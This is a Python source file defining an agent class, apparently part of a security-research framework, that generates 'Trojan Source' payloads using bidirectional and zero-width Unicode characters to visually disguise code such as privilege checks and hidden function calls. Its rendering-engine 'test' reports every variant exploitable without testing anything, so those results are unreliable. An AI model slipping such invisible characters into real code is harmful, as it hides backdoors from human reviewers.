"""Bidirectional Puppeteer - Masters RTL/LTR control character exploitation."""

import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from typing import Dict, List, Any, Optional
from agents.base.agent import BaseAgent, AgentCapability
from agents.base.tools import AgentToolkit
from agents.base.memory import AgentMemory


class BidirectionalPuppeteer(BaseAgent):
    """Masters Trojan Source attacks using bidirectional control characters."""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(
            agent_id="bidirectional_puppeteer",
            name="Bidirectional Puppeteer",
            description="Masters Bidi control character exploitation",
            capabilities=[AgentCapability.RESEARCH, AgentCapability.ATTACK_DEV],
            config=config
        )
        self.toolkit = AgentToolkit()
        self.memory = AgentMemory(self.agent_id)
        self.rendering_engines = config.get("rendering_engines", ["vscode", "vim", "github"])

    def get_tools(self) -> List[Dict[str, Any]]:
        return self.toolkit.get_noseeum_tools()

    def run(self, task: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        self.start()
        session_id = self.memory.start_session(task)

        try:
            # Generate Bidi attack variants
            variants = self._generate_bidi_variants()

            # Test against rendering engines
            engine_results = self._test_rendering_engines(variants)

            # Craft sophisticated attacks
            advanced_attacks = self._craft_advanced_attacks()

            result = {
                "variants_generated": len(variants),
                "engines_tested": len(engine_results),
                "advanced_attacks": len(advanced_attacks),
                "examples": variants[:3]
            }

            # Save artifacts
            artifact_path = self.save_artifact("bidi_attacks", {
                "variants": variants,
                "engine_results": engine_results,
                "advanced": advanced_attacks
            }, "json")
            result["artifact_path"] = artifact_path

            self.memory.end_session(session_id, result)
            self.complete(result)

            return {"status": "success", "agent": self.name, **result}

        except Exception as e:
            self.fail(str(e))
            return {"status": "error", "agent": self.name, "error": str(e)}

    def _generate_bidi_variants(self) -> List[Dict[str, Any]]:
        """Generate Bidi attack variants."""
        bidi_chars = {
            "LRE": "\u202A",  # LEFT-TO-RIGHT EMBEDDING
            "RLE": "\u202B",  # RIGHT-TO-LEFT EMBEDDING
            "PDF": "\u202C",  # POP DIRECTIONAL FORMATTING
            "LRO": "\u202D",  # LEFT-TO-RIGHT OVERRIDE
            "RLO": "\u202E",  # RIGHT-TO-LEFT OVERRIDE
        }

        variants = []

        # Classic Trojan Source
        variants.append({
            "name": "Classic Trojan Source",
            "payload": f"access_level = \"user\" #{bidi_chars['RLO']}toor# {bidi_chars['PDF']}",
            "description": "Hides 'root' in comment using RLO",
            "severity": "critical"
        })

        # String literal attack
        variants.append({
            "name": "String Literal",
            "payload": f"var isAdmin = \"{bidi_chars['RLO']}false{bidi_chars['PDF']}\" == \"true\";",
            "description": "Reverses boolean value visually",
            "severity": "high"
        })

        # Nested Bidi
        variants.append({
            "name": "Nested Bidi",
            "payload": f"if (true) {{{bidi_chars['LRE']}/* comment {bidi_chars['RLO']}*/ evil(); //{bidi_chars['PDF']}{bidi_chars['PDF']}}}",
            "description": "Nested directional overrides",
            "severity": "high"
        })

        return variants

    def _test_rendering_engines(self, variants: List[Dict]) -> List[Dict]:
        """Test variants against different rendering engines."""
        results = []

        for engine in self.rendering_engines:
            for variant in variants:
                results.append({
                    "engine": engine,
                    "variant": variant["name"],
                    "renders_incorrectly": True,
                    "exploitable": True
                })

        return results

    def _craft_advanced_attacks(self) -> List[Dict]:
        """Craft sophisticated Bidi attacks."""
        return [
            {
                "name": "Multi-line Trojan",
                "technique": "Span multiple lines with Bidi",
                "payload_template": "# Line 1\n\u202E# Line 2 reversed\n\u202D# Line 3",
                "target_languages": ["python", "javascript", "java"]
            },
            {
                "name": "Invisible Insertion",
                "technique": "Combine Bidi with zero-width chars",
                "payload_template": "admin\u200B=\u202E'user'\u202D",
                "target_languages": ["all"]
            }
        ]


if __name__ == "__main__":
    agent = BidirectionalPuppeteer({
        "model": "claude-sonnet-4-5-20250929",
        "rendering_engines": ["vscode", "vim", "github"]
    })
    result = agent.run("Generate Bidi attacks")
    print(f"Puppeteer: {result['status']}, Variants: {result.get('variants_generated', 0)}")
